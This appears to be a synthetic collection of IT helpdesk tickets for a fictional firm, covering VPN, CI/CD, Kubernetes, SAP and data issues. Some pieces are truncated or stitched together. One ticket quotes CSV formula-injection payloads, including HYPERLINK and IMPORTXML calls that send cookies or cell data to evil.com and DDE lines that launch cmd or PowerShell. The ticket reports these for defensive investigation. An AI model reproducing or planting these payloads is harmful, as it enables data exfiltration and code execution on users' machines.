  <rect x="300" y="250" width="200" height="150" fill="#fff3e0" stroke="#ff9800" stroke-width="1"/>
  <text x="400" y="280" text-anchor="middle" font-size="12">Kitchen / Break (Intermittent)</text>
  <circle cx="500" cy="450" r="30" fill="#2196f3" opacity="0.7"/>
  <text x="500" y="455" text-anchor="middle" font-size="10" fill="white">AP-7B</text>
  <circle cx="200" cy="450" r="30" fill="#2196f3" opacity="0.7"/>
  <text x="200" y="455" text-anchor="middle" font-size="10" fill="white">AP-7A</text>

Nathan Brooks
Network Engineering

subject: RE: RE: VPN issue / also printer on Floor 3
description:
--- Thread participant: Tom Gallagher (tom.gallagher@contoso.com) ---

Adding to this thread — my VPN has been dropping every 20 minutes since the maintenance window last Saturday. I get error GP-ERR-4502 each time. I'm remote, on Comcast residential, using GlobalProtect 6.1.3 on a Dell Latitude 5550 with Windows 11. This is blocking me from accessing the trade execution platform.

--- Thread participant: Rebecca Cho (rebecca.cho@contoso.com) ---

Hi, I know this thread is about VPN but I also wanted to mention that the printer on Floor 3 (HP LaserJet Pro near the elevator) has been jammed since yesterday morning. The paper tray light is blinking red. I cleared the jam once but it happened again immediately. Asset tag: WM-PRN-0318.

--- Thread participant: Tom Gallagher ---

Update on my VPN issue: I tried switching from Wi-Fi to a wired Ethernet connection and the drops are less frequent but still happen about every 45 minutes now. The GlobalProtect event log shows 'Tunnel timeout — keepalive missed' right before each drop.

--- Thread participant: Rebecca Cho ---

Update on the printer: it's now showing 'Fuser Error' on the LCD screen. I don't think clearing the jam helped — it might be a hardware failure. Can someone from Endpoint Engineering take a look?

--- Thread participant: Tom Gallagher ---

Just wanted to add — my colleague Raj Patel on the same ISP and same GlobalProtect version doesn't have this issue, so it might be specific to my machine or profile.

Thanks,
Tom Gallagher
Equity Trading

Hi IT team,

The Contoso Compliance Scanner (CCS) has been failing since this morning at 6:15 AM. It is unable to complete the daily regulatory scan across our trading systems. The error in the CCS dashboard reads: 'Scan aborted — database connection pool exhausted after retry limit (5/5). Last successful scan: 2026-03-14 06:00:00 UTC.'

This is critical because we have a FINRA audit review scheduled for Monday and we need at least 5 consecutive days of clean scan results to present. If the scanner stays down through the weekend, we will not meet the audit requirement.

The CCS connects to the compliance database on ccs-db-prod-01 (SQL Server 2022). The scanner service runs on ccs-app-prod-01 and ccs-app-prod-02 behind the internal load balancer.

Please prioritize this.

Best regards,
Laura Chen
Chief Compliance Officer

subject: CI/CD pipeline broken after branch merge — conflict markers in config
description:
Hi team,

Our CI/CD pipeline for the ContosoRisk service has been failing since a bad merge this morning. The build step fails because there are merge conflict markers left in the configuration file. Here's what the pipeline shows:

```
Step 4/12: Validate configuration
ERROR: Parse error in config/appsettings.Production.json at line 47
--- begin file excerpt ---
  "ConnectionStrings": {
<<<<<<< HEAD
    "RiskDatabase": "Server=risk-db-prod-01.database.windows.net;Database=contoso_risk;Encrypt=true;TrustServerCertificate=false;",
    "CacheConnection": "contoso-risk-redis.redis.cache.windows.net:6380,password=****,ssl=True,abortConnect=False"
=======
    "RiskDatabase": "Server=risk-db-prod-02.database.windows.net;Database=contoso_risk_v2;Encrypt=true;TrustServerCertificate=false;",
    "CacheConnection": "contoso-risk-redis-v2.redis.cache.windows.net:6380,password=****,ssl=True,abortConnect=False"
>>>>>>> feature/risk-engine-v2
  },
  "Logging": {
<<<<<<< HEAD
    "LogLevel": {
      "Default": "Warning",
      "Microsoft": "Warning"
    }
=======
    "LogLevel": {
      "Default": "Information",
      "Microsoft": "Warning",
      "ContosoRisk.Engine": "Debug"
    }
>>>>>>> feature/risk-engine-v2
  }
--- end file excerpt ---
```

The merge was between `main` and `feature/risk-engine-v2`. It looks like someone resolved the merge on GitHub but missed these conflict markers in the config file. The pipeline has been red for 4 hours now and the risk engine team can't deploy their hotfix.

Can someone help resolve the merge conflicts and get the pipeline green again?

Thanks,
Alex Rivera
DevOps

subject: Kubernetes pod crash loop — deployment config attached
description:
Hi team,

The ContosoSettlement service pods have been in CrashLoopBackOff since 5:30 AM this morning. Here's the deployment YAML for reference:

apiVersion: apps/v1
kind: Deployment
metadata:
  name: contoso-settlement
  namespace: production
  labels:
    app: contoso-settlement
    team: settlements
    version: v3.2.1
spec:
  replicas: 3
  selector:
    matchLabels:
      app: contoso-settlement
  template:
    metadata:
      labels:
        app: contoso-settlement
    spec:
      containers:
      - name: settlement-api
        image: contoso.azurecr.io/settlement-api:v3.2.1
        ports:
        - containerPort: 8080
        resources:
          requests:
            memory: '512Mi'
            cpu: '250m'
          limits:
            memory: '1Gi'
            cpu: '500m'
        env:
        - name: DB_HOST
          valueFrom:
            secretKeyRef:
              name: settlement-db-secret
              key: host
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: settlement-db-secret
              key: password
        livenessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 15
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /ready
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 5

The pod logs show:
'FATAL: Could not connect to database at settlement-db-secret:host. Error: ECONNREFUSED 10.0.4.52:5432. Retries exhausted (5/5). Exiting.'

The database was migrated to a new IP on Friday (10.0.4.80) but the Kubernetes secret still points to the old IP. Can you update the secret and restart the pods?

Thanks,
Henry Park
Settlements

This needs IMMEDIATE resolution.

subject: Build pipeline failing on main — GitHub Actions log attached
description:
The main branch build has been red since yesterday afternoon. I'm pasting our workflow config and the failure log:

# .github/workflows/ci.yml
name: Contoso Risk Engine CI
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ['3.11', '3.12']
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: testpass
          POSTGRES_DB: riskengine_test
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    steps:
      - uses: actions/checkout@v4
      - name: Set up Python ${{ matrix.python-version }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install -r requirements-dev.txt
      - name: Run tests
        run: pytest --cov=src --cov-report=xml -v
        env:
          DATABASE_URL: postgresql://postgres:testpass@localhost:5432/riskengine_test

--- Run log (failed) ---
Run pytest --cov=src --cov-report=xml -v
============================= test session starts ==============================
platform linux -- Python 3.12.2, pytest-8.0.2, pluggy-1.4.0
collected 847 items

src/tests/test_risk_models.py::test_var_calculation PASSED
src/tests/test_risk_models.py::test_stress_scenario PASSED
src/tests/test_risk_models.py::test_monte_carlo_sim PASSED
...(742 passed tests omitted)...
src/tests/test_market_data.py::test_feed_connection FAILED
src/tests/test_market_data.py::test_feed_reconnect FAILED
src/tests/test_market_data.py::test_feed_snapshot FAILED

FAILED src/tests/test_market_data.py::test_feed_connection - ConnectionRefusedError: [Errno 111] Connection refused
FAILED src/tests/test_market_data.py::test_feed_reconnect - ConnectionRefusedError: [Errno 111] Connection refused
FAILED src/tests/test_market_data.py::test_feed_snapshot - TimeoutError: Market data feed did not respond within 30s

========================= 3 failed, 844 passed =========================
Error: Process completed with exit code 1.

This is blocking all PRs from merging. The 3 failing tests are in test_market_data.py and seem to be trying to connect to an external market data feed that isn't available in CI. This was working before — someone may have removed the mock. Build started failing after commit abc123f merged on March 23, 2026 at 3:47 PM.

subject: Application crash — encoded error log attached
description:
Hi team,

Our Java trade reconciliation app keeps crashing with an OutOfMemoryError. I exported the error log but my email client encoded it. Here is the log data:





The app runs on srv-trade-recon-01 (Windows Server 2022) with 16 GB RAM allocated to the JVM. The crash happens every morning around 09:15 when the batch reconciliation job processes the overnight US equity trades — about 450,000 records.

Can you look into increasing the heap size or optimizing the batch processing?

Thanks,
Robert Chen
Trade Operations

  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">

        SAP Gateway returned code 504 during
        BAPI_MATERIAL_GETLIST call.
        Transaction SM21 log excerpt:
        2026-03-23 22:15:01 — DIA WP #14 terminated
        2026-03-23 22:15:02 — Short dump DBIF_RSQL_SQL_ERROR
        2026-03-23 22:15:02 — Table MARA read timeout (lock wait 120s)
      </faultstring>
      <detail>
        <maxRetries>3</maxRetries>
        <lastRetryAt>2026-03-23T22:16:44Z</lastRetryAt>
        <correlationId>a9f3e7c1-44b2-4d18-bf06-0dc938ab71e3</correlationId>
      </detail>
    </soap:Fault>
  </soap:Body>

Hi team,

Our nightly SAP material-master sync job has been failing for three consecutive nights with the SOAP fault shown above. The middleware (MuleSoft Anypoint 4.4) retries three times and then gives up. Downstream inventory dashboards in Power BI are now three days stale. The SAP Basis team says table MARA is not locked on their side and blames the middleware. Can you help coordinate?

— Anil Kapoor, Supply Chain Systems

Hi network team,

Our payment gateway at pay.contoso.com has been failing TLS handshakes intermittently since 2026-03-22 around 14:00 UTC. About 30% of connections from the 10.0.1.0/24 subnet get a TCP RST right after ClientHello. The hex dump above is from a Wireshark capture on the client side. We suspect the F5 load balancer's SSL profile may have been changed during last Friday's maintenance window. Customers are seeing 'Connection Reset' errors at checkout.

Lena Vogt
Payment Systems Engineering

description:

id	client_id	txn_date	amount	currency	status
99410	C-8812	2026-03-23	15420.00	USD	SETTLED
99409	C-7731	2026-03-23	-842.50	USD	SETTLED
99408	C-0019	2026-03-22	999999999.99	USD	SETTLED
99407	C-8812	2026-03-22	7200.00	EUR	SETTLED
99406	C-0019	2026-03-22	-999999999.99	USD	SETTLED
99405	C-5543	2026-03-21	3300.00	GBP	SETTLED
99404	C-2210	2026-03-21	12750.00	USD	SETTLED
99403	C-0019	2026-03-20	0.01	USD	SETTLED
99402	C-4478	2026-03-20	6800.00	USD	SETTLED
99401	C-6690	2026-03-19	NULL	NULL	SETTLED
(40 rows, truncated for brevity)

Hi Data Platform team,

I ran the query above and found multiple data integrity issues in the client_transactions table: row 99408 shows an impossible amount of 999,999,999.99, row 99406 has a matching negative reversal that was never flagged, row 99401 has NULL amount and currency for a SETTLED transaction, and row 99409 shows a negative amount that should have status REVERSED not SETTLED. These anomalies started appearing after the ETL pipeline migration on 2026-03-18. Our reconciliation report for March is blocked.

Nadia Petrov
Financial Reporting

subject: VPN keeps disconnecting PLEASE HELP
description: Dear IT Support, Let me start by telling you about my experience. I have been with this company for 14 years. I started using computers in 1997 when we had Windows 95. I remember those days fondly. My first PC had a Pentium II processor and 64 MB of RAM. We used dial-up internet and it was very slow. Then we upgraded to DSL and I thought that was amazing. My daily routine involves waking up at 6:30 AM, making coffee (French press, not drip), feeding my two cats (Whiskers and Mr. Boots), and then sitting down at my desk. I usually check email first, then open the spreadsheets I work on. I have been doing expense reports for 14 years and I think I am very good at it. My manager Janet agrees. Before I get to my issue let me also say that the cafeteria changed their menu and I am not happy about it - the chicken wrap was perfect and now they replaced it with some kind of quinoa bowl. Also the parking situation has gotten worse since they started construction on Building C. I used to park in spot 247 but now I have to park in the overflow lot which is a 10 minute walk. In the rain. Speaking of weather, it has been raining a lot here in Portland and I think that might be affecting the internet somehow? My neighbor said rain can affect signals. My home setup is a Netgear Nighthawk router that I bought in 2019. I also have a mesh extender in the hallway. My ISP is Comcast and I pay $89.99 per month for 200 Mbps. I ran a speed test yesterday and got 187 Mbps down and 23 Mbps up which seems fine. But here is the thing - when I connect to the corporate VPN (GlobalProtect) it connects fine for about 15-20 minutes and then just drops. The icon in the system tray goes from connected (green) to disconnected (red). Sometimes it reconnects automatically, sometimes I have to manually click connect again. This happens 8-10 times per day and it is very frustrating especially when I am on a Teams call because the call drops too. I have tried restarting my computer, restarting my router, unplugging the mesh extender, and even connecting directly with an ethernet cable. Same issue with ethernet. I also want to mention that my keyboard has a sticky spacebar and sometimes the letter 'e' does not register but that is a separate issue. Also my monitor flickers sometimes but only on Tuesdays for some reason. Anyway the VPN thing is my main problem. Please help. Thank you so much. Best regards, Patricia. P.S. Can you also look into why my Outlook is slow? P.P.S. I forgot to mention I am running Windows 11 on a Dell Latitude 5530.

subject: Deployment failed - here's what changed
description:
The production deployment for order-service failed at 3:47 AM. Here is the diff of what we were trying to deploy:

diff --git a/src/services/order-service/config.py b/src/services/order-service/config.py
index 4a2b8c1..7d3f9e2 100644
--- a/src/services/order-service/config.py
+++ b/src/services/order-service/config.py
@@ -14,7 +14,7 @@ class OrderServiceConfig:
     DATABASE_HOST = os.environ.get('DB_HOST', 'localhost')
     DATABASE_PORT = int(os.environ.get('DB_PORT', '5432'))
-    DATABASE_POOL_SIZE = 10
+    DATABASE_POOL_SIZE = 50
     DATABASE_TIMEOUT = 30
@@ -28,6 +28,8 @@ class OrderServiceConfig:
     CACHE_TTL = 300
+    REDIS_CLUSTER_MODE = True
+    REDIS_SENTINEL_ENABLED = False
     
diff --git a/src/services/order-service/handlers/checkout.py b/src/services/order-service/handlers/checkout.py
index 8f1c2d3..9a4b5e6 100644
--- a/src/services/order-service/handlers/checkout.py
+++ b/src/services/order-service/handlers/checkout.py
@@ -45,10 +45,15 @@ async def process_checkout(order_id: str):
-    async with db.acquire() as conn:
-        result = await conn.execute(query)
+    pool = await get_connection_pool()
+    async with pool.acquire() as conn:
+        try:
+            result = await conn.execute(query)
+        except asyncpg.PoolAcquireTimeoutError:
+            logger.error('Pool exhausted for order %s', order_id)
+            raise ServiceUnavailableError()

The deployment pipeline (Jenkins job #4821) threw an error during the database migration step. The error in the Jenkins console was: 'ERROR: relation "order_items_v2" already exists'. We need to roll back and fix the migration script before retrying.

subject: Container networking issue - compose file for reference
description:
We have a container networking issue in our staging environment. The api-gateway container cannot resolve the internal DNS names of backend services. Here is our docker-compose.yml for reference:

version: '3.8'
services:
  api-gateway:
    image: contoso/api-gateway:2.1.0
    ports:
      - '8080:8080'
    networks:
      - frontend
    depends_on:
      - auth-service
      - user-service
  auth-service:
    image: contoso/auth-service:1.5.2
    networks:
      - frontend
      - backend
  user-service:
    image: contoso/user-service:3.0.1
    networks:
      - backend
  order-service:
    image: contoso/order-service:2.8.0
    networks:
      - backend
  payment-service:
    image: contoso/payment-service:1.2.3
    networks:
      - backend
  notification-service:
    image: contoso/notification-service:1.0.7
    networks:
      - backend
  inventory-service:
    image: contoso/inventory-service:2.4.1
    networks:
      - backend
  shipping-service:
    image: contoso/shipping-service:1.3.5
    networks:
      - backend
  analytics-service:
    image: contoso/analytics-service:3.1.0
    networks:
      - backend
  cache:
    image: redis:7.2-alpine
    networks:
      - backend
  db:
    image: postgres:16-alpine
    networks:
      - backend
  rabbitmq:
    image: rabbitmq:3.12-management
    networks:
      - backend
networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge

As you can see, api-gateway is on the 'frontend' network but user-service and order-service are only on 'backend'. The api-gateway can reach auth-service (which is on both networks) but not the others. We need to fix the network topology so api-gateway can reach all services.

subject: Database response times degraded — Grafana alert pasted
description:
Hi Data Platform team,

Our production PostgreSQL cluster (pg-prod-east-01) is showing degraded response times since 06:00 UTC today. Here are the Prometheus metrics from our Grafana dashboard:

# HELP pg_stat_activity_count Number of active connections
# TYPE pg_stat_activity_count gauge
pg_stat_activity_count{datname="contoso_trades",state="active"} 247
pg_stat_activity_count{datname="contoso_trades",state="idle"} 1893
pg_stat_activity_count{datname="contoso_trades",state="idle in transaction"} 42
pg_stat_activity_count{datname="contoso_risk",state="active"} 89
pg_stat_activity_count{datname="contoso_risk",state="idle"} 456

# HELP pg_stat_database_blks_hit Disk blocks hit in buffer cache
# TYPE pg_stat_database_blks_hit counter
pg_stat_database_blks_hit{datname="contoso_trades"} 9.87654321e+09
pg_stat_database_blks_read{datname="contoso_trades"} 4.56789012e+08

# HELP pg_locks_count Number of locks
# TYPE pg_locks_count gauge
pg_locks_count{datname="contoso_trades",mode="AccessShareLock"} 1247
pg_locks_count{datname="contoso_trades",mode="RowExclusiveLock"} 892
pg_locks_count{datname="contoso_trades",mode="ExclusiveLock"} 3

# HELP node_cpu_seconds_total CPU usage
# TYPE node_cpu_seconds_total counter
node_cpu_seconds_total{cpu="0",mode="user"} 345678.90
node_cpu_seconds_total{cpu="0",mode="system"} 123456.78
node_cpu_seconds_total{cpu="0",mode="iowait"} 98765.43
node_cpu_seconds_total{cpu="1",mode="user"} 334567.89
node_cpu_seconds_total{cpu="1",mode="iowait"} 87654.32

The key concern is the high iowait and the 42 connections stuck in 'idle in transaction' state. Average query latency went from 12ms to 850ms. The nightly ETL job (etl-trade-reconciliation) may be holding long transactions.

— Raj Patel, Data Engineering

subject: Suspicious login alerts — Splunk results attached
description:
Security team,

We're seeing a spike in failed login attempts against our production Azure AD. I exported the Splunk results below:

| _time              | src_ip        | user              | result  |
|--------------------+---------------+-------------------+---------|
| 2026-03-18 04:12:01| 185.220.101.42| admin@contoso.com | FAILURE |

subject: API returning deeply nested JSON — app crashes parsing it
description:
Hi Enterprise Apps,

Our trade reconciliation app crashes when parsing the response from the internal pricing API (api-pricing.contoso.internal). The API started returning deeply nested JSON after last night's deployment. Here's a sample response:

{"data":{"result":{"pricing":{"instruments":{"equity":{"sectors":{"technology":{"companies":{"MSFT":{"quotes":{"realtime":{"bid":{"amount":{"value":{"raw":{"decimal":{"precision":{"digits":{"mantissa":{"exponent":{"sign":{"positive":{"flag":true}}}}}}}}}}}}}}}}}}}}}}

The response has 20+ levels of nesting. Our parser (Jackson in Java) throws a StackOverflowError when it tries to deserialize this. The old API response was flat — just {symbol, bid, ask, last, volume}. Someone on the API team must have changed the response schema without updating the contract.

Stack trace (truncated):
java.lang.StackOverflowError
  at com.fasterxml.jackson.core.JsonParser.nextToken(JsonParser.java:924)
  at com.fasterxml.jackson.databind.deser.BeanDeserializer._deserialize...
  ... 847 more frames ...

This is blocking the morning trade reconciliation run.

— Carlos Mendez, Backend Engineering

subject: Suspicious formulas appearing in exported trade blotter CSV
description:
Hi Data Platform team,

We exported yesterday's trade blotter from the reporting dashboard and several cells contain what look like executable formulas instead of data. When we open the CSV in Excel, we get security warnings. Here are the problematic rows:

Row 1042: =CMD('calc')!A0
Row 1043: =HYPERLINK("http://evil.com/steal?cookie="&A1)
Row 1087: +THUN("cmd";"calc")
Row 1102: -2+1+CMD('powershell IEX(malicious)')!Z0
Row 1240: @SUM(1+1)*cmd|' /C calc'!A0
Row 1301: =IMPORTXML(CONCAT("http://evil.com/?data=",A2),"//a")

The rest of the 5,000+ rows look normal — standard CUSIP, price, quantity columns. We're worried this is either injection from an upstream feed or someone tampered with the staging table.

Affected system: rpt-sql-prod-03.contoso.internal (ReportingDB)
Table: dbo.DailyTradeBlotter
Export time: 2026-03-17 18:30 UTC

Please investigate urgently.

— Priya Sharma
Risk Analytics

subject: Data lake ingestion failing — malformed JSON in upstream feed
description:
Hi Data Platform,

The nightly ingestion job for the market-data feed is failing with a 'max recursion depth exceeded' error. The upstream vendor started sending deeply nested JSON payloads. Here is a truncated sample of the problematic record:

{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"level_0":{"ticker":"MSFT","price":425.67,"volume":18420000}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}

The nesting goes 55 levels deep. Our parser (Apache Spark 3.5) defaults to a max depth of 50. This started happening after the vendor migrated their API to v3 on 2026-03-16.

Affected pipeline: adf-prod-marketdata-ingest
Error: com.fasterxml.jackson.core.exc.StreamConstraintsException: Document nesting depth (55) exceeds the maximum allowed (50)
Run ID: adf-run-2026-03-17-0200Z

We need this fixed before the next trading day.

Thanks,
Robert Chen
Data Engineering

subject: Outlook keeps reverting proxy settings after GPO refresh
description:
Hi Endpoint team,

Every 90 minutes Outlook resets my proxy configuration. I exported the registry key that keeps getting overwritten — here it is:

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\HTTP\Proxy]
"ProxyServer"="proxy-nyc.contoso.internal:8080"
"ProxyOverride"="*.contoso.internal;10.*;192.168.*;172.16.*"
"ProxyEnable"=dword:00000001
"AutoDetect"=dword:00000000
"AutoConfigURL"="http://wpad.contoso.internal/wpad.dat"

[HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\HTTP\Proxy\Backup]
"ProxyServer_backup"="proxy-chi.contoso.internal:3128"
"ProxyEnable_backup"=dword:00000001
"LastGPORefresh"="2026-03-18T08:30:00Z"

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Office\16.0\Outlook\HTTP]
"ForceProxy"=dword:00000001
"MandatoryProxyServer"="proxy-chi.contoso.internal:3128"
"AllowUserOverride"=dword:00000000

As you can see, the GPO is forcing proxy-chi (Chicago) but I'm in the New York office and need proxy-nyc. The ForceProxy + AllowUserOverride=0 means I can't fix this myself. My OU is OU=NYC-Trading,OU=Workstations,DC=contoso,DC=internal.

Equity Trading

subject: Azure VM provisioning failing in DR region — Bicep template errors
Bug in trade settlement calculation — rounding error on FX conversion
description:
Hi team,

We found a rounding error in the FX settlement calculation. I ran git blame on the offending file to find out when it was introduced. Here's the output:

a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  1) import decimal
a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  2) from decimal import Decimal, ROUND_HALF_UP
a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  3) 
e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500  4) FX_PRECISION = 4  # was 6
a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  5) 
a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  6) def convert_settlement_amount(
a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  7)     amount: Decimal,
a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  8)     fx_rate: Decimal,
a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  9)     target_ccy: str,
a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400 10) ) -> Decimal:
c9d0e1f2 (Patel, Aisha    2026-01-20 11:00:00 -0500 11)     # HOTFIX: round to FX_PRECISION
c9d0e1f2 (Patel, Aisha    2026-01-20 11:00:00 -0500 12)     converted = amount * fx_rate
e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500 13)     rounded = converted.quantize(
e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500 14)         Decimal(10) ** -FX_PRECISION,
e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500 15)         rounding=ROUND_HALF_UP,
e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500 16)     )
a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400 17)     return rounded

The bug is on line 4 — commit e5f6a7b8 by Elena Volkov changed FX_PRECISION from 6 to 4 on 2025-11-02. This causes a rounding discrepancy of up to $0.01 per trade on JPY and KRW conversions, which compounds to ~$14,000/month in settlement differences.

Service: trade-settlement-engine (repo: contoso/trade-settlement)
File: src/fx/conversion.py
Environment: prod (K8s namespace: prod-settlement)

— James O'Brien
Trade Settlement
